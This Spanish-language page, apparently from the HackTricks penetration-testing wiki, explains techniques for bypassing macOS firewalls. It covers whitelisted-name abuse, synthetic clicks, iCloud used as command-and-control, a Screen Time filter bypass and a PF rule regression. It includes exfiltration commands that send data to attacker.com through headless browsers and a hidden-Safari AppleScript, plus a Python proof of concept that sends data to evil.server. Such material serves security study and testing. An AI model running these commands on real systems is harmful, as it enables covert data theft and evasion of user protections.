# macOS Bypassing Firewalls

{{#include ../../banners/hacktricks-training.md}}

## Técnicas encontradas

Las siguientes técnicas se encontraron funcionando en algunas aplicaciones de firewall de macOS.

### Abuso de nombres en la lista blanca

- Por ejemplo, llamar al malware con nombres de procesos bien conocidos de macOS como **`launchd`**

### Clic sintético

- Si el firewall pide permiso al usuario, hacer que el malware **haga clic en permitir**

### **Usar binarios firmados por Apple**

- Como **`curl`**, pero también otros como **`whois`**

### Dominios de Apple bien conocidos

El firewall podría estar permitiendo conexiones a dominios de Apple bien conocidos como **`apple.com`** o **`icloud.com`**. Y iCloud podría ser utilizado como un C2.

### Bypass genérico

Algunas ideas para intentar eludir firewalls

### Verificar tráfico permitido

Conocer el tráfico permitido te ayudará a identificar dominios potencialmente en la lista blanca o qué aplicaciones tienen permiso para acceder a ellos.
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Abusando de DNS

Las resoluciones DNS se realizan a través de la aplicación firmada **`mdnsreponder`** que probablemente estará permitida para contactar servidores DNS.

<figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### A través de aplicaciones de navegador

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Inyección de procesos

Si puedes **inyectar código en un proceso** que tiene permiso para conectarse a cualquier servidor, podrías eludir las protecciones del firewall:


{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## Vulnerabilidades recientes de bypass del firewall de macOS (2023-2025)

### Bypass del filtro de contenido web (Tiempo de pantalla) – **CVE-2024-44206**
En julio de 2024, Apple corrigió un error crítico en Safari/WebKit que rompía el “filtro de contenido web” a nivel del sistema utilizado por los controles parentales de Tiempo de pantalla. 
Una URI especialmente diseñada (por ejemplo, con “://” codificado en doble URL) no es reconocida por la ACL de Tiempo de pantalla, pero es aceptada por WebKit, por lo que la solicitud se envía sin filtrar. Cualquier proceso que pueda abrir una URL (incluido código en sandbox o no firmado) puede, por lo tanto, acceder a dominios que están explícitamente bloqueados por el usuario o un perfil MDM.

Prueba práctica (sistema sin parches):
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### Error de orden de reglas del filtro de paquetes (PF) en las primeras versiones de macOS 14 “Sonoma”
Durante el ciclo beta de macOS 14, Apple introdujo una regresión en el envoltorio de espacio de usuario alrededor de **`pfctl`**. 
Las reglas que se añadieron con la palabra clave `quick` (utilizada por muchos interruptores de corte de VPN) fueron ignoradas silenciosamente, causando filtraciones de tráfico incluso cuando una GUI de VPN/firewall reportaba *bloqueado*. El error fue confirmado por varios proveedores de VPN y corregido en RC 2 (build 23A344).

Verificación rápida de filtraciones:
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Abusando de los servicios auxiliares firmados por Apple (heredado – pre-macOS 11.2)
Antes de macOS 11.2, la **`ContentFilterExclusionList`** permitía ~50 binarios de Apple como **`nsurlsessiond`** y la App Store eludir todos los firewalls de filtro de socket implementados con el marco de Network Extension (LuLu, Little Snitch, etc.). 
El malware podía simplemente generar un proceso excluido—o inyectar código en él—y tunelizar su propio tráfico a través del socket ya permitido. Apple eliminó completamente la lista de exclusión en macOS 11.2, pero la técnica sigue siendo relevante en sistemas que no pueden ser actualizados.

Ejemplo de prueba de concepto (pre-11.2):
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
---

## Consejos de herramientas para macOS moderno

1. Inspeccionar las reglas PF actuales que generan los firewalls GUI:
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. Enumerar los binarios que ya tienen el privilegio *outgoing-network* (útil para piggy-backing):
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. Registrar programáticamente tu propio filtro de contenido de Network Extension en Objective-C/Swift.
Un PoC mínimo sin root que reenvía paquetes a un socket local está disponible en el código fuente de **LuLu** de Patrick Wardle.

## Referencias

- [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- <https://nosebeard.co/advisories/nbl-001.html>
- <https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html>

{{#include ../../banners/hacktricks-training.md}}
